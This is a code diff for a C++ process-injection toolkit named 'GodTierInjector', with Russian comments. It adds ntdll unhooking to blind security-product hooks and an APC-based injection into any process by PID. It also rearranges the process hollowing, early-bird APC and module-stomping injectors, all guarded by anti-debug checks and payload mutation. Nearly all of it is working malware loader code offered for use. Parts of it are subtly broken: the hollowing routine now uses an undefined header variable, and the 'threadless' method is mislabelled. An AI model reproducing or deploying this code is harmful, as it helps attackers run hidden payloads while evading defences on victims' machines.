@@ -1,10 +1,10 @@
 // =============================================
-// GOD TIER INJECTOR v3.3 - COMPLETE FINAL VERSION
+// GOD TIER INJECTOR v3.5 - COMPLETE FINAL VERSION
 // =============================================
 
 class GodTierInjector {
 public:
-    explicit GodTierInjector(UltimateBlackMutationEngine& engine);
+    explicit GodTierInjector(UltimateBlackMutationEngine& engine, bool enableUnhooking = true);
 
     bool ProcessHollowingInject(const std::wstring& targetPath,
                                 const std::vector<uint8_t>& rawData,
@@ -22,11 +22,22 @@ public:
                              const std::vector<uint8_t>& rawData,
                              bool applyMutation = true);
 
+    bool ThreadlessInject(DWORD targetPid,
+                          const std::vector<uint8_t>& rawData,
+                          bool applyMutation = true);
+
     bool ExecuteStompedModule(PVOID address, bool wait = false);
 
 private:
     UltimateBlackMutationEngine& mutationEngine;
     UltimateBlackMutationEngine::EngineParams defaultParams;
+    bool unhookingEnabled;
+
+    // === Встроенный Unhooking ===
+    HMODULE GetCleanNtdll(bool preferKnownDlls = true);
+    bool UnhookFunction(HMODULE hCleanNtdll, const char* functionName);
+    bool UnhookCriticalFunctions(HMODULE hCleanNtdll);
+    void PerformUnhooking();
 
     std::vector<uint8_t> PreparePayload(const std::vector<uint8_t>& data, bool applyMutation);
     bool MapPEIntoProcess(HANDLE hProcess, PVOID newBase, 
@@ -40,15 +51,83 @@ private:
 };
 
 // ==================== КОНСТРУКТОР ====================
-GodTierInjector::GodTierInjector(UltimateBlackMutationEngine& engine)
-    : mutationEngine(engine)
+GodTierInjector::GodTierInjector(UltimateBlackMutationEngine& engine, bool enableUnhooking)
+    : mutationEngine(engine), unhookingEnabled(enableUnhooking)
 {
     AntiDebug::Initialize();
+
+    if (unhookingEnabled) {
+        PerformUnhooking();
+    }
 
     defaultParams.mutationIntensity = 7;
     defaultParams.enableAntiDebug = true;
     defaultParams.enableRuntimeSelfMod = true;
     defaultParams.preserveRelocations = true;
+}
+
+// ==================== ВСТРОЕННЫЙ UNHOOKING ====================
+HMODULE GodTierInjector::GetCleanNtdll(bool preferKnownDlls) {
+    if (preferKnownDlls) {
+        HANDLE hSection = nullptr;
+        OBJECT_ATTRIBUTES objAttr{};
+        UNICODE_STRING sectionName;
+        RtlInitUnicodeString(&sectionName, L"\\KnownDlls\\ntdll.dll");
+        InitializeObjectAttributes(&objAttr, &sectionName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
+
+        if (NT_SUCCESS(NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &objAttr))) {
+            PVOID baseAddress = nullptr;
+            SIZE_T viewSize = 0;
+            if (NT_SUCCESS(NtMapViewOfSection(hSection, NtCurrentProcess(), &baseAddress, 0, 0,
+                                              nullptr, &viewSize, ViewShare, 0, PAGE_READONLY))) {
+                CloseHandle(hSection);
+                return (HMODULE)baseAddress;
+            }
+            CloseHandle(hSection);
+        }
+    }
+
+    return LoadLibraryExA("C:\\Windows\\System32\\ntdll.dll", nullptr,
+                          DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
+}
+
+bool GodTierInjector::UnhookFunction(HMODULE hCleanNtdll, const char* functionName) {
+    if (!hCleanNtdll || !functionName) return false;
+
+    FARPROC cleanFunc = GetProcAddress(hCleanNtdll, functionName);
+    FARPROC hookedFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"), functionName);
+
+    if (!cleanFunc || !hookedFunc) return false;
+    if (memcmp(cleanFunc, hookedFunc, 16) == 0) return true;
+
+    DWORD oldProtect;
+    if (!VirtualProtect(hookedFunc, 16, PAGE_EXECUTE_READWRITE, &oldProtect))
+        return false;
+
+    memcpy(hookedFunc, cleanFunc, 16);
+    VirtualProtect(hookedFunc, 16, oldProtect, &oldProtect);
+    return true;
+}
+
+bool GodTierInjector::UnhookCriticalFunctions(HMODULE hCleanNtdll) {
+    const char* functions[] = {
+        "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtProtectVirtualMemory",
+        "NtCreateThreadEx", "NtResumeThread", "NtQueueApcThread",
+        "NtCreateProcessEx", "NtUnmapViewOfSection", "NtSetInformationThread",
+        "NtQueryInformationProcess"
+    };
+
+    bool result = true;
+    for (const char* func : functions) {
+        if (!UnhookFunction(hCleanNtdll, func)) result = false;
+    }
+    return result;
+}
+
+void GodTierInjector::PerformUnhooking() {
+    HMODULE hCleanNtdll = GetCleanNtdll(true);
+    if (!hCleanNtdll) hCleanNtdll = GetCleanNtdll(false);
+    if (hCleanNtdll) UnhookCriticalFunctions(hCleanNtdll);
 }
 
 // ==================== ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ====================
@@ -58,7 +137,6 @@ std::vector<uint8_t> GodTierInjector::PreparePayload(const std::vector<uint8_t>&
     return mutationEngine.UltimateEncrypt(data, {}, seed, defaultParams);
 }
 
-// ==================== MAP PE ====================
 bool GodTierInjector::MapPEIntoProcess(HANDLE hProcess, PVOID newBase, 
                                        const std::vector<uint8_t>& peData, PVOID& entryPoint)
 {
@@ -81,14 +159,18 @@ bool GodTierInjector::MapPEIntoProcess(HANDLE hProcess, PVOID newBase,
     return true;
 }
 
-// ==================== FIX RELOCATIONS ====================
 bool GodTierInjector::FixRelocations(HANDLE hProcess, PVOID newBase, PVOID preferredBase) {
     BYTE headers[0x1000] = {0};
-    SIZE_T read = 0;
-    ReadProcessMemory(hProcess, newBase, headers, sizeof(headers), &read);
+    SIZE_T bytesRead = 0;
+
+    if (!ReadProcessMemory(hProcess, newBase, headers, sizeof(headers), &bytesRead) ||
+        bytesRead < sizeof(IMAGE_DOS_HEADER)) return false;
 
     auto dos = (PIMAGE_DOS_HEADER)headers;
-    auto nt  = (PIMAGE_NT_HEADERS)(headers + dos->e_lfanew);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+
+    auto nt = (PIMAGE_NT_HEADERS)(headers + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
 
     DWORD relocRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
     if (relocRVA == 0) return true;
@@ -98,26 +180,28 @@ bool GodTierInjector::FixRelocations(HANDLE hProcess, PVOID newBase, PVOID prefe
 
     while (true) {
         IMAGE_BASE_RELOCATION reloc = {};
-        SIZE_T bytesRead = 0;
-        ReadProcessMemory(hProcess, current, &reloc, sizeof(reloc), &bytesRead);
-        if (reloc.VirtualAddress == 0) break;
+        if (!ReadProcessMemory(hProcess, current, &reloc, sizeof(reloc), &bytesRead) ||
+            bytesRead != sizeof(reloc) || reloc.SizeOfBlock == 0) break;
 
-        std::vector<WORD> entries((reloc.SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD));
-        ReadProcessMemory(hProcess, (PVOID)((ULONG_PTR)current + sizeof(IMAGE_BASE_RELOCATION)),
-                          entries.data(), entries.size() * sizeof(WORD), nullptr);
+        DWORD entryCount = (reloc.SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+        std::vector<WORD> entries(entryCount);
+
+        if (!ReadProcessMemory(hProcess, (PVOID)((ULONG_PTR)current + sizeof(IMAGE_BASE_RELOCATION)),
+                               entries.data(), entryCount * sizeof(WORD), &bytesRead) ||
+            bytesRead != entryCount * sizeof(WORD)) break;
 
         for (WORD entry : entries) {
             if (entry == 0) continue;
-
             WORD type = entry >> 12;
             WORD offset = entry & 0xFFF;
 
             if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
                 PVOID patchAddr = (PVOID)((ULONG_PTR)newBase + reloc.VirtualAddress + offset);
                 ULONG_PTR value = 0;
-                ReadProcessMemory(hProcess, patchAddr, &value, sizeof(ULONG_PTR), nullptr);
-                value += delta;
-                g_NtWriteVirtualMemory(hProcess, patchAddr, &value, sizeof(ULONG_PTR), nullptr);
+                if (ReadProcessMemory(hProcess, patchAddr, &value, sizeof(ULONG_PTR), nullptr)) {
+                    value += delta;
+                    g_NtWriteVirtualMemory(hProcess, patchAddr, &value, sizeof(ULONG_PTR), nullptr);
+                }
             }
         }
         current = (PVOID)((ULONG_PTR)current + reloc.SizeOfBlock);
@@ -125,7 +209,6 @@ bool GodTierInjector::FixRelocations(HANDLE hProcess, PVOID newBase, PVOID prefe
     return true;
 }
 
-// ==================== SET PROCESS PARAMETERS ====================
 bool GodTierInjector::SetProcessParameters(HANDLE hProcess,
                                            const std::wstring& imagePath,
                                            const std::wstring& commandLine,
@@ -171,7 +254,7 @@ bool GodTierInjector::SetProcessParameters(HANDLE hProcess,
     g_NtWriteVirtualMemory(hProcess, remoteParams, params, params->Length, nullptr);
 
     PROCESS_BASIC_INFORMATION pbi = {};
-    // g_NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
+    g_NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
 
     if (pbi.PebBaseAddress) {
         PVOID paramPtr = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x20);
@@ -181,7 +264,163 @@ bool GodTierInjector::SetProcessParameters(HANDLE hProcess,
     return true;
 }
 
-// ==================== DOPPELGANGING ====================
+// ==================== ОСНОВНЫЕ МЕТОДЫ ИНЪЕКЦИИ ====================
+
+bool GodTierInjector::ProcessHollowingInject(const std::wstring& targetPath,
+                                             const std::vector<uint8_t>& rawData,
+                                             bool applyMutation)
+{
+    if (AntiDebug::PerformAntiDebugChecks()) return false;
+
+    auto payload = PreparePayload(rawData, applyMutation);
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+
+    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        return false;
+    }
+
+    bool success = false;
+
+    do {
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_FULL;
+        if (!GetThreadContext(pi.hThread, &ctx)) break;
+
+        PVOID oldBase = nullptr;
+        PVOID remotePeb = (PVOID)ctx.Rdx;
+        if (!ReadProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)remotePeb + 0x10), 
+                               &oldBase, sizeof(PVOID), nullptr)) break;
+
+        if (!NT_SUCCESS(g_NtUnmapViewOfSection(pi.hProcess, oldBase))) break;
+
+        PVOID newBase = nullptr;
+        SIZE_T regionSize = payload.size() + 0x2000;
+        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(pi.hProcess, &newBase, 0, &regionSize,
+                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) break;
+
+        PVOID entryPoint = nullptr;
+        if (!MapPEIntoProcess(pi.hProcess, newBase, payload, entryPoint)) break;
+        if (!FixRelocations(pi.hProcess, newBase, (PVOID)nt->OptionalHeader.ImageBase)) break;
+
+        PVOID imageBaseAddr = (PVOID)((ULONG_PTR)remotePeb + 0x10);
+        g_NtWriteVirtualMemory(pi.hProcess, imageBaseAddr, &newBase, sizeof(PVOID), nullptr);
+
+        ctx.Rcx = (ULONG_PTR)entryPoint;
+        SetThreadContext(pi.hThread, &ctx);
+
+        g_NtResumeThread(pi.hThread, nullptr);
+        success = true;
+
+    } while (false);
+
+    if (pi.hThread) CloseHandle(pi.hThread);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+
+    return success;
+}
+
+bool GodTierInjector::EarlyBirdInject(const std::wstring& targetPath,
+                                      const std::vector<uint8_t>& rawData,
+                                      bool applyMutation)
+{
+    if (AntiDebug::PerformAntiDebugChecks()) return false;
+
+    auto payload = PreparePayload(rawData, applyMutation);
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+
+    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        return false;
+    }
+
+    bool success = false;
+
+    do {
+        PVOID remoteMemory = nullptr;
+        SIZE_T regionSize = payload.size();
+
+        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(pi.hProcess, &remoteMemory, 0, &regionSize,
+                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) break;
+
+        if (!NT_SUCCESS(g_NtWriteVirtualMemory(pi.hProcess, remoteMemory, 
+                                               (PVOID)payload.data(), payload.size(), nullptr))) break;
+
+        ULONG oldProtect = 0;
+        if (!NT_SUCCESS(g_NtProtectVirtualMemory(pi.hProcess, &remoteMemory, &regionSize,
+                                                 PAGE_EXECUTE_READ, &oldProtect))) break;
+
+        if (!NT_SUCCESS(g_NtQueueApcThread(pi.hThread, (PAPCFUNC)remoteMemory, 
+                                           nullptr, nullptr, nullptr))) break;
+
+        g_NtResumeThread(pi.hThread, nullptr);
+        success = true;
+
+    } while (false);
+
+    if (pi.hThread) CloseHandle(pi.hThread);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+
+    return success;
+}
+
+bool GodTierInjector::ModuleStompingInject(const std::wstring& legitimateDllPath,
+                                           const std::vector<uint8_t>& rawData,
+                                           bool applyMutation)
+{
+    if (AntiDebug::PerformAntiDebugChecks()) return false;
+
+    auto payload = PreparePayload(rawData, applyMutation);
+
+    HMODULE hModule = LoadLibraryW(legitimateDllPath.c_str());
+    if (!hModule) return false;
+
+    bool success = false;
+
+    do {
+        auto dos = (PIMAGE_DOS_HEADER)hModule;
+        auto nt  = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
+        auto section = IMAGE_FIRST_SECTION(nt);
+
+        PVOID textSection = nullptr;
+        SIZE_T textSize = 0;
+
+        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+            if (memcmp(section[i].Name, ".text", 5) == 0) {
+                textSection = (PVOID)((ULONG_PTR)hModule + section[i].VirtualAddress);
+                textSize = section[i].Misc.VirtualSize;
+                break;
+            }
+        }
+
+        if (!textSection || payload.size() > textSize) break;
+
+        PVOID baseAddr = textSection;
+        SIZE_T regionSize = textSize;
+        ULONG oldProtect = 0;
+
+        if (!NT_SUCCESS(g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
+                                                 PAGE_READWRITE, &oldProtect))) break;
+
+        g_NtWriteVirtualMemory(GetCurrentProcess(), textSection, 
+                               (PVOID)payload.data(), payload.size(), nullptr);
+
+        baseAddr = textSection;
+        regionSize = textSize;
+        g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
+                                 PAGE_EXECUTE_READ, &oldProtect);
+
+        success = true;
+
+    } while (false);
+
+    return success;
+}
+
 bool GodTierInjector::DoppelgangingInject(const std::wstring& targetPath,
                                           const std::vector<uint8_t>& rawData,
                                           bool applyMutation)
@@ -282,168 +521,85 @@ bool GodTierInjector::DoppelgangingInject(const std::wstring& targetPath,
     return true;
 }
 
-// ==================== EARLY BIRD ====================
-bool GodTierInjector::EarlyBirdInject(const std::wstring& targetPath,
-                                      const std::vector<uint8_t>& rawData,
-                                      bool applyMutation)
+bool GodTierInjector::ThreadlessInject(DWORD targetPid,
+                                       const std::vector<uint8_t>& rawData,
+                                       bool applyMutation)
 {
     if (AntiDebug::PerformAntiDebugChecks()) return false;
 
     auto payload = PreparePayload(rawData, applyMutation);
+    if (payload.empty()) return false;
 
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {};
-
-    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        return false;
-    }
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+    if (!hProcess) return false;
 
     bool success = false;
 
     do {
+        HANDLE hThread = nullptr;
+        THREADENTRY32 te32 = {};
+        te32.dwSize = sizeof(THREADENTRY32);
+
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) break;
+
+        if (Thread32First(hSnapshot, &te32)) {
+            do {
+                if (te32.th32OwnerProcessID == targetPid) {
+                    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+                    if (hThread) break;
+                }
+            } while (Thread32Next(hSnapshot, &te32));
+        }
+        CloseHandle(hSnapshot);
+
+        if (!hThread) break;
+
+        auto antiDebugCode = mutationEngine.GenerateAntiDebugStub(defaultParams);
+
         PVOID remoteMemory = nullptr;
-        SIZE_T regionSize = payload.size();
+        SIZE_T totalSize = antiDebugCode.size() + payload.size() + 0x1000;
 
-        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(pi.hProcess, &remoteMemory, 0, &regionSize,
-                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) break;
-
-        if (!NT_SUCCESS(g_NtWriteVirtualMemory(pi.hProcess, remoteMemory, 
-                                               (PVOID)payload.data(), payload.size(), nullptr))) break;
-
-        ULONG oldProtect = 0;
-        if (!NT_SUCCESS(g_NtProtectVirtualMemory(pi.hProcess, &remoteMemory, &regionSize,
-                                                 PAGE_EXECUTE_READ, &oldProtect))) break;
-
-        if (!NT_SUCCESS(g_NtQueueApcThread(pi.hThread, (PAPCFUNC)remoteMemory, 
-                                           nullptr, nullptr, nullptr))) break;
-
-        g_NtResumeThread(pi.hThread, nullptr);
-        success = true;
-
-    } while (false);
-
-    if (pi.hThread) CloseHandle(pi.hThread);
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-
-    return success;
-}
-
-// ==================== MODULE STOMPING ====================
-bool GodTierInjector::ModuleStompingInject(const std::wstring& legitimateDllPath,
-                                           const std::vector<uint8_t>& rawData,
-                                           bool applyMutation)
-{
-    if (AntiDebug::PerformAntiDebugChecks()) return false;
-
-    auto payload = PreparePayload(rawData, applyMutation);
-
-    HMODULE hModule = LoadLibraryW(legitimateDllPath.c_str());
-    if (!hModule) return false;
-
-    bool success = false;
-
-    do {
-        auto dos = (PIMAGE_DOS_HEADER)hModule;
-        auto nt  = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
-        auto section = IMAGE_FIRST_SECTION(nt);
-
-        PVOID textSection = nullptr;
-        SIZE_T textSize = 0;
-
-        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-            if (memcmp(section[i].Name, ".text", 5) == 0) {
-                textSection = (PVOID)((ULONG_PTR)hModule + section[i].VirtualAddress);
-                textSize = section[i].Misc.VirtualSize;
-                break;
-            }
+        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &totalSize,
+                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+            CloseHandle(hThread);
+            break;
         }
 
-        if (!textSection || payload.size() > textSize) break;
+        if (!antiDebugCode.empty()) {
+            g_NtWriteVirtualMemory(hProcess, remoteMemory, 
+                                   antiDebugCode.data(), antiDebugCode.size(), nullptr);
+        }
 
-        PVOID baseAddr = textSection;
-        SIZE_T regionSize = textSize;
-        ULONG oldProtect = 0;
-
-        if (!NT_SUCCESS(g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
-                                                 PAGE_READWRITE, &oldProtect))) break;
-
-        g_NtWriteVirtualMemory(GetCurrentProcess(), textSection, 
+        PVOID payloadBase = (PVOID)((ULONG_PTR)remoteMemory + antiDebugCode.size());
+        g_NtWriteVirtualMemory(hProcess, payloadBase, 
                                (PVOID)payload.data(), payload.size(), nullptr);
 
-        baseAddr = textSection;
-        regionSize = textSize;
-        g_NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
-                                 PAGE_EXECUTE_READ, &oldProtect);
+        ULONG oldProtect = 0;
+        PVOID protectBase = remoteMemory;
+        SIZE_T protectSize = totalSize;
+
+        if (!NT_SUCCESS(g_NtProtectVirtualMemory(hProcess, &protectBase, &protectSize,
+                                                 PAGE_EXECUTE_READ, &oldProtect))) {
+            CloseHandle(hThread);
+            break;
+        }
+
+        if (!NT_SUCCESS(g_NtQueueApcThread(hThread, (PAPCFUNC)remoteMemory, 
+                                           nullptr, nullptr, nullptr))) {
+            CloseHandle(hThread);
+            break;
+        }
 
         success = true;
+        CloseHandle(hThread);
 
     } while (false);
 
+    CloseHandle(hProcess);
     return success;
 }
 
-// ==================== PROCESS HOLLOWING ====================
-bool GodTierInjector::ProcessHollowingInject(const std::wstring& targetPath,
-                                             const std::vector<uint8_t>& rawData,
-                                             bool applyMutation)
-{
-    if (AntiDebug::PerformAntiDebugChecks()) return false;
-
-    auto payload = PreparePayload(rawData, applyMutation);
-
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {};
-
-    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        return false;
-    }
-
-    bool success = false;
-
-    do {
-        CONTEXT ctx = {};
-        ctx.ContextFlags = CONTEXT_FULL;
-        if (!GetThreadContext(pi.hThread, &ctx)) break;
-
-        PVOID oldBase = nullptr;
-        PVOID remotePeb = (PVOID)ctx.Rdx;
-        if (!ReadProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)remotePeb + 0x10), 
-                               &oldBase, sizeof(PVOID), nullptr)) break;
-
-        if (!NT_SUCCESS(g_NtUnmapViewOfSection(pi.hProcess, oldBase))) break;
-
-        PVOID newBase = nullptr;
-        SIZE_T regionSize = payload.size() + 0x2000;
-        if (!NT_SUCCESS(g_NtAllocateVirtualMemory(pi.hProcess, &newBase, 0, &regionSize,
-                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) break;
-
-        PVOID entryPoint = nullptr;
-        if (!MapPEIntoProcess(pi.hProcess, newBase, payload, entryPoint)) break;
-
-        auto dos = (PIMAGE_DOS_HEADER)payload.data();
-        auto nt  = (PIMAGE_NT_HEADERS)(payload.data() + dos->e_lfanew);
-        if (!FixRelocations(pi.hProcess, newBase, (PVOID)nt->OptionalHeader.ImageBase)) break;
-
-        PVOID imageBaseAddr = (PVOID)((ULONG_PTR)remotePeb + 0x10);
-        g_NtWriteVirtualMemory(pi.hProcess, imageBaseAddr, &newBase, sizeof(PVOID), nullptr);
-
-        ctx.Rcx = (ULONG_PTR)entryPoint;
-        SetThreadContext(pi.hThread, &ctx);
-
-        g_NtResumeThread(pi.hThread, nullptr);
-        success = true;
-
-    } while (false);
-
-    if (pi.hThread) CloseHandle(pi.hThread);
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-
-    return success;
-}
-
-// ==================== EXECUTE STOMPED MODULE ====================
 bool GodTierInjector::ExecuteStompedModule(PVOID address, bool wait) {
     if (!address) return false;
 
